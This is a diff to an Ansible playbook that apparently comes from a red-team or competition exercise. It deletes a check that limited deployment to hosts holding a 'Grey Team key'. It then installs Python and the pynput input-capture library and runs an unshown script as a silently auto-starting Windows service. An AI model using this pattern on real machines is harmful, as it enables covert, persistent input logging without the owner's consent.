@@ -12,39 +12,43 @@
     greyteam_key: C:\\greyteam_key
   
   tasks:
-    - name: Check Grey Team key
-      stat:
-        path: "{{ greyteam_key }}"
-      register: key_check
+    - name: Install Python
+      win_chocolatey:
+        name: python
+        state: present
 
-    - block:
-        - name: Make sure the directory exists
-          ansible.windows.win_file:
-            path: "{{ service_directory }}"
-            state: directory
+    - name: Install pynput
+      win_pip:
+        name: pynput
+        executable: C:\Python312\python.exe
 
-        - name: Copy script over
-          ansible.windows.win_copy:
-            src: "{{ local_file }}"
-            dest: "{{ service_script }}"
+    - name: Make sure the directory exists
+      ansible.windows.win_file:
+        path: "{{ service_directory }}"
+        state: directory
 
-        - name: Copy nssm over
-          ansible.windows.win_copy:
-            src: "{{ local_nssm }}"
-            dest: "{{ nssm_exe }}"
+    - name: Copy script over
+      ansible.windows.win_copy:
+        src: "{{ local_file }}"
+        dest: "{{ service_script }}"
 
-        - name: Install service
-          ansible.windows.win_shell: |
-            & "{{ nssm_exe }}" install "{{ service_name }}" "{{ service_script }}"
-            & "{{ nssm_exe }}" set "{{ service_name }}" AppDirectory "{{ service_directory }}"
+    - name: Copy nssm over
+      ansible.windows.win_copy:
+        src: "{{ local_nssm }}"
+        dest: "{{ nssm_exe }}"
 
-        - name: Set service to auto start
-          ansible.windows.win_service:
-            name: "{{ service_name }}"
-            start_mode: auto
+    - name: Install service
+      ansible.windows.win_shell: |
+        & "{{ nssm_exe }}" install "{{ service_name }}" "{{ service_script }}"
+        & "{{ nssm_exe }}" set "{{ service_name }}" AppDirectory "{{ service_directory }}"
 
-        - name: Start Service
-          ansible.windows.win_service:
-            name: "{{ service_name }}"
-            state: started
-      when: key_check.stat.exists  
+    - name: Set service to auto start
+      ansible.windows.win_service:
+        name: "{{ service_name }}"
+        start_mode: auto
+
+    - name: Start Service
+      ansible.windows.win_service:
+        name: "{{ service_name }}"
+        state: started
+
